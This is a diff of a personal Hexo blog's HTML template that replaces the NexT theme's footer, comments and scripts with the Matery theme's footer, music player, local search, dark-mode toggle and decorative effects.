-                <a href="/posts/4b18615c/" rel="prev" title="NSSCTF 2nd wp">
-                  <i class="fa fa-chevron-left"></i> NSSCTF 2nd wp
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/posts/2611e12a/" rel="next" title="HASHTEAM香山杯WP">
-                  HASHTEAM香山杯WP <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
 
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
+    
 
-
-
-
-    <div class="comments" id="waline"></div>
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2024</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">lmarch2</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-    <span title="站点总字数">212k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="站点阅读时长">3:13</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-    <span class="post-meta-item" id="busuanzi_container_site_uv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div><script color="0,255,0" opacity="0.5" zIndex="-1" count="150" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
-
-<script type="text/javascript" src="/js/click_firework.js"></script>
+</main>
 
 
-<div>
-  <span id="sitetime"></span>
-  <script language=javascript>
-      function siteTime(){
-          window.setTimeout("siteTime()", 1000);
-          var seconds = 1000;
-          var minutes = seconds * 60;
-          var hours = minutes * 60;
-          var days = hours * 24;
-          var years = days * 365;
-          var today = new Date();
-          var todayYear = today.getFullYear();
-          var todayMonth = today.getMonth()+1;
-          var todayDate = today.getDate();
-          var todayHour = today.getHours();
-          var todayMinute = today.getMinutes();
-          var todaySecond = today.getSeconds();
-          /* 
-          Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
-          year - 作为date对象的年份，为4位年份值
-          month - 0-11之间的整数，做为date对象的月份
-          day - 1-31之间的整数，做为date对象的天数
-          hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
-          minutes - 0-59之间的整数，做为date对象的分钟数
-          seconds - 0-59之间的整数，做为date对象的秒数
-          microseconds - 0-999之间的整数，做为date对象的毫秒数
-      */
-          var t1 = Date.UTC(2023,1,12,00,00,00); //北京时间2018-2-13 00:00:00
-          var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
-          var diff = t2-t1;
-      var diffYears = Math.floor(diff/years);
-      var diffDays = Math.floor((diff/days)-diffYears*365);
-      var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
-      var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
-      var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
-      document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
     }
-      siteTime();
-  </script>
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="9232910433"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
 </div>
 
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
 
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024</span>
+            
+            <a href="/about" target="_blank">lmarch2</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">30.5k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2024";
+                        var startMonth = "2";
+                        var startDate = "2";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lmarch2" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2524158037@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2524158037" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2524158037" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
     </div>
-  </footer>
+</footer>
 
-  
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
-
-  <a href="https://github.com/lmarch2" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
+<div class="progress-bar"></div>
 
 
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
 
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
 
-  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.3.0/mermaid.min.js","integrity":"sha256-QdTG1YTLLTwD3b95jLqFxpQX9uYuJMNAtVZgwKX4oYU="}}</script>
-  <script src="/js/third-party/tags/mermaid.js"></script>
-
-
-  <script src="/js/third-party/pace.js"></script>
-
-  
-  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://waline-blog-flax-two.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"请文明评论呀","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/posts/ec1aa757/"}</script>
-<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
-<script>
-document.addEventListener('page:loaded', () => {
-  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
-    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
-  ).then(() => 
-    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
-  );
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
 });
 </script>
 
-//Aplayer播放器
-<link rel="stylesheet" href="/dist/APlayer.css">
-<div id="aplayer"></div>
-<script type="text/javascript" src="/dist/APlayer.min.js"></script>
-<script type="text/javascript" src="/dist/music.js"></script>
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?cc5591f1cf5578c35e013c88875b4cd1";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
-</html>
 
+</html>
